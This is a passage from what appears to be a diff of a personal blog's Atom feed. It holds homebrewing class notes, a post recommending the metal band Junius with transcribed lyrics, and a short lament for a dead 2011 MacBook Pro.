SANITIZE - StarSan is your friend Fermenter - 30 second shake Brew day Only use cold water Grains into water before bringing to boil - 170 degrees max / ~20 minutes Cut heat when adding extract or malt Don’t squeeze the grains when removing from the kettle, just let it drip No need to stir hops Avoid boil over by removing heat, don’t blow on foam Do not put a lid on the boil, causes off flavors Clarifiers are awesome, but not for all beers (ie. hefeweizen) Wort chiller could be added into boil near the end (5min) to sanitize, but better idea to just sanitize in solution Add chilled water to wort after boil to bring to fermenter. Fill to 5.25-5.5 gallons. Be sure to stir wort prior to OG reading after adding chilled water. Taste it and remember it for comparison post-fermination. Fermenting The sooner the fermentation begins the better. Hopefully 12-24 hours. If nothing happens after 36+ hours - pitch new yeast If there isn’t much action, check temp of the fermenter. Should be in the mid-high end for the yeast strain ideally. Secondary After OG remains consistent for 2-3 days in a row, transfer. Secondary is absolutely necessary for beers with OG &amp;gt; 1.05 Used to smooth out taste or add other flavors (like a dry hop) Try not to disturb the cake of the primary fermenter when transferring Dry hopping - can be done at any time during the secondary timeframe (~2 weeks) OG measurement - taste should be approx 75% less sweet than the original OG measurement (wort) Bottling Use corn sugar, it’s the best for bottle conditioning Dried malt extract (DME) could be used for more bubbles, but takes longer to condition (3+ weeks) Stir the boiled sugar into bottling bucket for thorough mixture, gently. Turn the bottle to its side after capping to ensure proper seal Amount of corn sugar per 5gal batch 4.5 oz - Bar type carbonation 4 oz - better for English beers 4.75 oz - Belgians Enjoyment 2-3 weeks to condition, max 3 If OG 1.030 –&amp;gt; Drink within 2 months If OG is higher –&amp;gt; Drink within 6 months</summary></entry><entry><title type="html">Becoming a Metaphysician</title><link href="http://localhost:4000/music/2017/08/16/becoming-a-metaphysician.html" rel="alternate" type="text/html" title="Becoming a Metaphysician" /><published>2017-08-16T23:40:00-05:00</published><updated>2017-08-16T23:40:00-05:00</updated><id>http://localhost:4000/music/2017/08/16/becoming-a-metaphysician</id><content type="html" xml:base="http://localhost:4000/music/2017/08/16/becoming-a-metaphysician.html">&lt;h2 id=&quot;breathe-out-breathe-in&quot;&gt;Breathe out, Breathe in&lt;/h2&gt;
-
-&lt;p&gt;I really need to get around to typing up some notes I want to digitize from some recent events.  Particularly, beer making and homelab crap.  Time, truly the most precious commodity.&lt;/p&gt;
-
-&lt;p&gt;Maybe this weekend!&lt;/p&gt;
-
-&lt;p&gt;I just had to post something quick about a new band I found named Junius.&lt;/p&gt;
-
-&lt;p&gt;I subscribe to &lt;a href=&quot;https://www.decibelmagazine.com&quot;&gt;Decibel&lt;/a&gt;, which I recommend for anyone who has moved beyond the glory days that consisted of massive amounts of free time and very little responsibility.  Those days are behind me now for sure, and Decibel is my go-to for keeping up with the metal scene other than a key friend who is still living his glory days.&lt;/p&gt;
-
-&lt;p&gt;Decibel had a review for the new Junius album &lt;em&gt;Eternal Rituals for the Accretion of Light&lt;/em&gt;.  I believe they gave it a 8 or 9 out of 10. The album is so damn good and it’s basically been on repeat for me the last month or so.  Highly recommend you click &lt;a href=&quot;https://www.youtube.com/watch?v=tv_yKPChhq4&quot;&gt;here&lt;/a&gt; and check out the song &lt;em&gt;Mass for Metaphysicians&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;The theme throughout the album regarding the path to transcendence only adds to the enjoyment of the music itself.  I think this will be one of my top 2017 albums for sure.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://f4.bcbits.com/img/a1160145689_16.jpg&quot; alt=&quot;img&quot; title=&quot;Eternal Rituals&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;I took a stab at the lyrics to &lt;a href=&quot;https://www.youtube.com/watch?v=gpSsLb59B1o&quot;&gt;&lt;em&gt;Black Sarcophagus&lt;/em&gt;&lt;/a&gt; below which ends the album (probably my favorite track) and speaks to the existentialism tone throughout the album.&lt;/p&gt;
-
-&lt;p&gt;The lyrical content makes me think of Fear Factory or Meshuggah’s brand of constantly improving thyself.  Where as Fear Factory and Meshuggah go the route of a more cyborg-like reconstruction to the self in order to improve, Junius speaks more to spiriual transcendence by stepping beyond the physical realm.&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;Seal the room
-Light the fire
-Burning clothes
-The energy starts to flow
-
-I am what I've learned
-I meditate
-My body shakes
-The room starts to glow
-
-Pouring over me
-Higher frequencies
-The final hour of the pain I'll devour
-
-The bearer of light
-The primal tones
-Take my flesh and let me go
-
-The final march
-The seventh step
-The death of this dream has come
-
-All I have loved
-All I have held
-Has led to this sea of one
-
-All I have loved
-All I have held
-Has led to this song of souls
-
-Send me up now
-Send me up now
-Send me up now
-I'm ready for time to die
-I'm ready for infinite eyes
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>wittr</name></author><category term="music" /><summary type="html">Breathe out, Breathe in I really need to get around to typing up some notes I want to digitize from some recent events. Particularly, beer making and homelab crap. Time, truly the most precious commodity. Maybe this weekend! I just had to post something quick about a new band I found named Junius. I subscribe to Decibel, which I recommend for anyone who has moved beyond the glory days that consisted of massive amounts of free time and very little responsibility. Those days are behind me now for sure, and Decibel is my go-to for keeping up with the metal scene other than a key friend who is still living his glory days. Decibel had a review for the new Junius album Eternal Rituals for the Accretion of Light. I believe they gave it a 8 or 9 out of 10. The album is so damn good and it’s basically been on repeat for me the last month or so. Highly recommend you click here and check out the song Mass for Metaphysicians. The theme throughout the album regarding the path to transcendence only adds to the enjoyment of the music itself. I think this will be one of my top 2017 albums for sure. I took a stab at the lyrics to Black Sarcophagus below which ends the album (probably my favorite track) and speaks to the existentialism tone throughout the album. The lyrical content makes me think of Fear Factory or Meshuggah’s brand of constantly improving thyself. Where as Fear Factory and Meshuggah go the route of a more cyborg-like reconstruction to the self in order to improve, Junius speaks more to spiriual transcendence by stepping beyond the physical realm. Seal the room Light the fire Burning clothes The energy starts to flow I am what I've learned I meditate My body shakes The room starts to glow Pouring over me Higher frequencies The final hour of the pain I'll devour The bearer of light The primal tones Take my flesh and let me go The final march The seventh step The death of this dream has come All I have loved All I have held Has led to this sea of one All I have loved All I have held Has led to this song of souls Send me up now Send me up now Send me up now I'm ready for time to die I'm ready for infinite eyes</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>wittr</name></author><category term="beer" /><summary type="html">RIP Apple MBP Just wanted to hold a moment of silence in this post for my 2011 Macbook Pro that officially died this morning. /sadface After a lot of troubleshooting I narrowed it down to the keyboard’s power button and ended up ripping it all open and replacing the keyboard. The power button did work after that and I felt a moment of accomplishment. It continued to work up until I had to plug in the power cord to charge it. Overnight it charged while in “hibernation” due to being idle. Next day - nothing from the power button. Going through all the troubleshooting - no dice. Therefore, I’m going to conclude that there was a short going on somewhere that bricked the board when I hooked up the power and I’m moving on. I’ve still got my Samsung ultrabook to keep me company. Well - onto the brewing notes! I recently attended a brewing 101 session. I brewed for maybe 2 years off and on but never really tried to greatly improve. This time will hopefully be different. Key notes from the session below. Brew 101 Notes General Mark 5 gallons on fermenter for ease of use Do not use distilled water - no minerals Even temperatures during fermentation help yeast prevent off flavors Certain kinds of beer - higher fermentation temps help flavor (ie. bavarian hefeweizen and banana clove flavor) Think about a bag over a fermenter in case of eruption Avoid aluminum pots because they heat too quickly Don’t add nuts or anything with high fat to beer White Vinegar can clean a copper wort chiller OG - if lower than expected - expect to drink beer faster. If above, can dilute the wort before fermentation with extra water. Type Hops Flavor Grain Flavor American Piney Dry British Herbal/Earthy Bread-y German Mix of above Mix of above Belgian/French Pepper/Flower-y Biscuit New Zealand/Australia Tropical Fruit —— Procedure Prep Everything should be “Visibility” clean Cleanliness is the most important thing to brewing good beer CLEAN - PBW is your friend Fermenter - 30 min soak SANITIZE - StarSan is your friend Fermenter - 30 second shake Brew day Only use cold water Grains into water before bringing to boil - 170 degrees max / ~20 minutes Cut heat when adding extract or malt Don’t squeeze the grains when removing from the kettle, just let it drip No need to stir hops Avoid boil over by removing heat, don’t blow on foam Do not put a lid on the boil, causes off flavors Clarifiers are awesome, but not for all beers (ie. hefeweizen) Wort chiller could be added into boil near the end (5min) to sanitize, but better idea to just sanitize in solution Add chilled water to wort after boil to bring to fermenter. Fill to 5.25-5.5 gallons. Be sure to stir wort prior to OG reading after adding chilled water. Taste it and remember it for comparison post-fermination. Fermenting The sooner the fermentation begins the better. Hopefully 12-24 hours. If nothing happens after 36+ hours - pitch new yeast If there isn’t much action, check temp of the fermenter. Should be in the mid-high end for the yeast strain ideally. Secondary After OG remains consistent for 2-3 days in a row, transfer. Secondary is absolutely necessary for beers with OG &amp;gt; 1.05 Used to smooth out taste or add other flavors (like a dry hop) Try not to disturb the cake of the primary fermenter when transferring Dry hopping - can be done at any time during the secondary timeframe (~2 weeks) OG measurement - taste should be approx 75% less sweet than the original OG measurement (wort) Bottling Use corn sugar, it’s the best for bottle conditioning Dried malt extract (DME) could be used for more bubbles, but takes longer to condition (3+ weeks) Stir the boiled sugar into bottling bucket for thorough mixture, gently. Turn the bottle to its side after capping to ensure proper seal Amount of corn sugar per 5gal batch 4.5 oz - Bar type carbonation 4 oz - better for English beers 4.75 oz - Belgians Enjoyment 2-3 weeks to condition, max 3 If OG 1.030 –&amp;gt; Drink within 2 months If OG is higher –&amp;gt; Drink within 6 months</summary></entry></feed>
